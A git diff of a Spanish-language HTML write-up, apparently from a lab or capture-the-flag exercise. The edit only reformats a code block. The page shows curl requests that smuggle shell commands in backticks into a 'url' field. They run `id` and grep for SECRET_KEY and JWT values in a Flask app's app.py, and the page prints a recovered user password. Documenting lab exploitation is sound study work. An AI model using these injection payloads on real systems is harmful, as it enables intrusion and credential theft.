@@ -89,9 +89,10 @@
 -d '{"url":"127.0.0.1:80`id`","secret_key":"commandexecutionissecret"}'</code></pre>
 
                 <p><strong>Extracción de contraseñas de app.py:</strong></p>
-                <pre><code>curl -X POST http://192.168.56.103:8080/run \
+<pre><code>curl -X POST http://192.168.56.103:8080/run \
 -H "Content-Type: application/json" \
--d '{"url":"127.0.0.1:80`grep -E "SECRET_KEY|JWT" /home/patrick/flask_blog/app.py`","secret_key":"commandexecutionissecret"}'</code></pre>
+-d '{"url":"127.0.0.1:80`grep -E "SECRET_KEY|JWT" \
+/home/patrick/flask_blog/app.py`","secret_key":"commandexecutionissecret"}'</code></pre>
 
                 <p>Se obtuvo la contraseña del usuario patrick: <strong>NOreasonableDOUBTthisPASSWORDisGOOD</strong></p>
 
